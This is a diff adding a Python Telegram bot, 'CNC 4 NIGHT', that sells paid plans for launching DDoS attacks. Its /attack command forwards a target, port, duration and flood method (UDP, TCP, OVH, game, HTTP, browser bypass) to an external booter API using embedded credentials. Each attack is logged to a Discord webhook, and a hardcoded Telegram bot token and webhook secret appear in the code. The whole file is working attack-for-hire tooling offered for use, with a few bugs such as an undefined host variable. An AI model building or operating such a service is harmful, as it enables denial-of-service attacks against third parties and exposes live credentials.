@@ -1,0 +1,299 @@
+# source write by zxcr9999
+import telepot
+import time
+import datetime
+import requests
+import threading
+import subprocess
+import json
+import psutil
+from telepot.loop import MessageLoop
+
+webhook_url = 'https://discord.com/api/webhooks/1098048865581670430/Lg6ea3BY2GwG0Uo7Ht_deiZLN6aWVuJmQUh_lezadRR4X1mnl2lbfS-3mPvTxzRO9K5E'
+TOKEN = '6171307436:AAHLyEQ0s7rGwz_ac5th0LHwhBLfXE0DRi4'
+
+attack_slots = 2
+attack_slots_lock = threading.Lock()
+last_attack_time = None
+successful_attacks = []
+user_list = []
+
+def read_authorized_users():
+    try:
+        with open('users.txt', 'r') as f:
+            lines = f.readlines()
+            authorized_users = {}
+            for line in lines:
+                if line.strip():
+                    user_id, expiry_date_str, max_duration_str = line.strip().split(':')
+                    expiry_date = datetime.datetime.strptime(expiry_date_str, '%Y-%m-%d')
+                    max_duration = int(max_duration_str)
+                    authorized_users[int(user_id)] = {'expiry_date': expiry_date, 'max_duration': max_duration}
+                return authorized_users
+    except FileNotFoundError:
+        return {}
+
+def write_authorized_users(authorized_users):
+    with open('users.txt', 'w') as f:
+        for user_id, info in authorized_users.items():
+            expiry_date_str = info['expiry_date'].strftime('%Y-%m-%d')
+            max_duration_str = str(info['max_duration'])
+            f.write(f"{user_id}:{expiry_date_str}:{max_duration_str}\n")
+
+def is_user_authorized(user_id):
+    global authorized_users
+    if user_id not in authorized_users:
+        return False
+    info = authorized_users[user_id]
+    if info['expiry_date'] < datetime.datetime.now():
+        del authorized_users[user_id]
+        write_authorized_users(authorized_users)
+        bot.sendMessage(user_id, 'Your plan has expired. Contact @tcpsynn to renew.')
+        return False
+    return True
+
+def add_admin_user(user_id):
+    global admin_users
+    admin_users.add(user_id)
+
+def remove_admin_user(user_id):
+    global admin_users
+    if user_id in admin_users:
+        admin_users.remove(user_id)
+
+def get_username(user_id):
+    user = bot.getChat(user_id)
+    if 'username' in user:
+        return user['username']
+    else:
+        return None
+
+def handle_message(msg):
+    global authorized_users
+    global admin_users
+    global attack_slots
+    global last_attack_time
+    global successful_attacks
+
+    content_type, chat_type, chat_id = telepot.glance(msg)
+    user_id = msg['from']['id']
+    
+    if user_id not in user_list:
+        user_list.append(user_id)
+
+    if not last_attack_time:
+        last_attack_time = None
+
+    if not is_user_authorized(user_id):
+        bot.sendMessage(chat_id, 'You dont have plan. Contact @tcpsynn for buying plan.')
+        return
+
+    if user_id not in admin_users:
+        if content_type == 'text' and (msg['text'].startswith('/adduser') or msg['text'].startswith('/removeuser') or msg['text'].startswith('/updateuser') or msg['text'].startswith('/userlist') or msg['text'].startswith('/notification')):
+            bot.sendMessage(chat_id, 'Only admin can using commands.')
+            return
+
+    if content_type == 'text':
+        text = msg['text']
+        if text == '/help':
+            bot.sendMessage(chat_id, 'User commands:\n/methods - Show attack methods.\n/attack - Sent attack.\n/running - Show running attacks..\n/info - Show bot information.\n/serverstatus - Show bot server status.\n/lookup - Lookup IP Address.\n\nAdmin commands:\n/adduser - Add new user.\n/removeuser - Remove user.\n/updateuser - Update user information.\n/userlist - Show all users information.\n/notification - Send message to all users.')
+        elif text == '/methods':
+            bot.sendMessage(chat_id, 'List Methods Layer7:\n- browser: ( BROWSER FAKE BYPASS )\n- http: ( HTTP FLOODER - ONLY FOR HTTP WEB )\nLIST METHODS LAYER4\n- udp: ( UDP FLOOD Optimized For Bypass )\n- ovh: ( OVH optimized For Bypass )\n- game: ( Game Flood Payload Max And Bypass )\n- tcp: ( Tcp Killer Max Payload )')
+        elif text == '/info':
+            bot.sendMessage(chat_id, 'CNC 4 NIGHT Bot:\n\nOwner: @tcpsynn\nVersion: 1.2\nMax slots attack: 2\nIf you want to buy plan. Contact @tcpsynn.')
+        elif text == '/running':
+            handle_running_command(chat_id)
+        elif text.startswith('/attack'):
+            if not is_user_authorized(user_id):
+                bot.sendMessage(chat_id, 'You dont have plan. Contact @tcpsynn for buying plan.')
+                return
+
+            if attack_slots < 1:
+                bot.sendMessage(chat_id, 'No available attack slot. Please wait...')
+                return
+
+            last_attack_time = datetime.datetime.now()
+
+            args = text.split()[1:]
+            if len(args) != 4:
+                bot.sendMessage(chat_id, 'Using /attack [target] [port] [duration] [method]')
+                return
+            target, port, duration, method = args
+            info = authorized_users[user_id]
+
+            max_duration = info['max_duration']
+            if int(duration) > max_duration:
+                bot.sendMessage(chat_id, 'Your maximum attack duration is {} seconds. Please buy more using less attack time.'.format(max_duration))
+                return
+                
+            url = f'https://pqtsec.cf/api/attack?username=cilentapihunter11&secret=khidsfdsfndsaqplfsda255&host={host}&port={port}&time={duration}&method={method}'
+            response = requests.get(url)
+
+            bot.sendMessage(chat_id, 'Attack sent!!\n\nTarget: {}\nPort: {}\nDuration: {}\nMethod: {}'.format(target, port, duration, method))
+
+            decrease_attack_slots()
+            threading.Timer(float(duration), increase_attack_slots).start()
+            last_attack_time = datetime.datetime.now()
+            write_authorized_users(authorized_users)
+
+            successful_attacks.append({
+                'target': target,
+                'port': port,
+                'duration': duration,
+                'method': method,
+                'user_id': user_id,
+                'time': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            })
+            
+            username = get_username(user_id)
+            if username:
+                username = get_username(user_id) or f'Unknown user {user_id}'
+                message = f"CNC 4 NIGHT Attack Logs:\n==============================\nUsername: {username}\nTarget: {target}\nPort: {port}\nDuration: {duration}\nMethod: {method}\nDate: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nAttack slots: {attack_slots}/2"
+
+            embed = {
+                'title': 'CNC 4 NIGHT Bot',
+                'description': message,
+                'color': 15158332,
+                'footer': {
+                    'icon_url': 'https://i.imgur.com/FywBjcj',
+                    'text': 'CNC 4 NIGHT Bot'
+                },
+                'thumbnail': {
+                    'url': 'https://i.imgur.com/VJmeyAU'
+                }
+            }
+        
+            payload = {
+                'embeds': [embed]
+            }
+            
+            headers = {
+                'Content-Type': 'application/json'
+            }
+            
+            response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
+            
+            if response.status_code != 204:
+                print('Failed to send message to Discord webhook')
+
+        elif text.startswith('/serverstatus'):
+            cpu_percent = psutil.cpu_percent()
+            memory = psutil.virtual_memory()
+            cpu_count = psutil.cpu_count()
+            total_gb = round(memory.total / (1024.0 ** 3), 2)
+            used_gb = round(memory.used / (1024.0 ** 3), 2)
+            message = f"CPU used: {cpu_percent}%\nCores: {cpu_count}\nRAM: Total {total_gb}GB, Used {used_gb}GB"
+            bot.sendMessage(chat_id, message)
+
+        if text.startswith('/lookup'):
+            ip = msg['text'].split()[1]
+            url = f'https://ipinfo.io/{ip}/json'
+            response = requests.get(url)
+            data = response.json()
+            message = f"IP: {ip}\nHostname: {data['hostname']}\nOrg: {data['org']}\nCountry: {data['country']}\nRegion: {data['region']}\nCity: {data['city']}\nTimezone: {data['timezone']}"
+            bot.sendMessage(chat_id, message)
+            
+        if text.startswith('/notification'):
+            message = text.replace('/notification', '', 1).strip()
+            for user in user_list:
+                bot.sendMessage(user, 'Notification:\n{}'.format(message))
+            bot.sendMessage(chat_id, 'Notification send to all users.')
+
+        elif text.startswith('/adduser'):
+            args = text.split()[1:]
+            if len(args) != 3:
+                bot.sendMessage(chat_id, 'Using: /adduser [id] [expiry date] [max attack times]')
+            target_user_id = int(args[0])
+            expiry_date_str = args[1]
+            max_duration = int(args[2])
+            expiry_date = datetime.datetime.strptime(expiry_date_str, '%Y-%m-%d')
+            authorized_users[target_user_id] = {'expiry_date': expiry_date, 'max_duration': max_duration}
+            write_authorized_users(authorized_users)
+            bot.sendMessage(chat_id, 'Added {} to access list with expiry date {} and maximum duration {} seconds.'.format(target_user_id, expiry_date_str, max_duration))
+        elif text.startswith('/removeuser'):
+            bot.sendMessage(chat_id, 'Using: /removeuser [id]')
+            user_id = int(text.split()[1])
+            if user_id in authorized_users:
+                del authorized_users[user_id]
+                write_authorized_users(authorized_users)
+                bot.sendMessage(chat_id, 'Removed {} from the access list.'.format(user_id))
+            else:
+                bot.sendMessage(chat_id, 'User {} not in the access list.'.format(user_id))
+        elif text.startswith('/updateuser'):
+            args = text.split()[1:]
+            if len(args) != 3:
+                bot.sendMessage(chat_id, 'Using: /updateuser [id] [expiry date] [max attack times]')
+            target_user_id = int(args[0])
+            expiry_date_str = args[1]
+            max_duration = int(args[2])
+            expiry_date = datetime.datetime.strptime(expiry_date_str, '%Y-%m-%d')
+            if target_user_id in authorized_users:
+                authorized_users[target_user_id]['expiry_date'] = expiry_date
+                authorized_users[target_user_id]['max_duration'] = max_duration
+                write_authorized_users(authorized_users)
+                bot.sendMessage(chat_id, 'Updated user {} with expiry date {} and maximum duration {} seconds.'.format(target_user_id, expiry_date_str, max_duration))
+            else:
+                bot.sendMessage(chat_id, 'User {} is not in the access list.'.format(target_user_id))
+        elif text == '/userlist':
+            handle_userlist_command(chat_id)
+            
+        else:
+            bot.sendMessage(chat_id, 'Using /help for show all commands')
+
+def handle_userlist_command(chat_id):
+    global authorized_users
+    userlist = ''
+    for user_id, info in authorized_users.items():
+        expiry_date_str = info['expiry_date'].strftime('%Y-%m-%d')
+        max_duration_str = str(info['max_duration'])
+        userlist += f'User ID: {user_id}\nExpiry Date: {expiry_date_str}\nMax Duration: {max_duration_str}\n\n'
+    bot.sendMessage(chat_id, userlist)
+
+def handle_running_command(chat_id):
+    global successful_attacks
+
+    if len(successful_attacks) == 0:
+        bot.sendMessage(chat_id, 'No successful attacks yet.')
+    else:
+        message = ''
+        for attack in successful_attacks:
+            message += f'Target: {attack["target"]}\nPort: {attack["port"]}\nDuration: {attack["duration"]}\nMethod: {attack["method"]}\nUser ID: {attack["user_id"]}\nDate: {attack["time"]}\n\n'
+        bot.sendMessage(chat_id, message)
+        successful_attacks = []
+
+def check_expired_users():
+    global authorized_users
+    now = datetime.datetime.now()
+    for user_id, user_info in list(authorized_users.items()):
+        expiry_date = user_info['expiry_date']
+        if expiry_date < now:
+            del authorized_users[user_id]
+            write_authorized_users(authorized_users)
+            bot.sendMessage(user_id, 'Your plan has expired. Contact @tcpsynn to renew.')
+    threading.Timer(86400, check_expired_users).start()
+
+def increase_attack_slots():
+    global attack_slots
+    with attack_slots_lock:
+        attack_slots += 1
+
+def decrease_attack_slots():
+    global attack_slots
+    with attack_slots_lock:
+        attack_slots -= 1
+
+if __name__ == '__main__':
+    bot = telepot.Bot(TOKEN)
+    authorized_users = read_authorized_users()
+    admin_users = set()
+    add_admin_user(1267510767) # admin user id here
+    MessageLoop(bot, handle_message).run_as_thread()
+
+    print('Bot running...')
+    check_expired_users()
+    while True:
+        try:
+            time.sleep(10)
+        except KeyboardInterrupt:
+            print('\nBot stopped.')
+            break
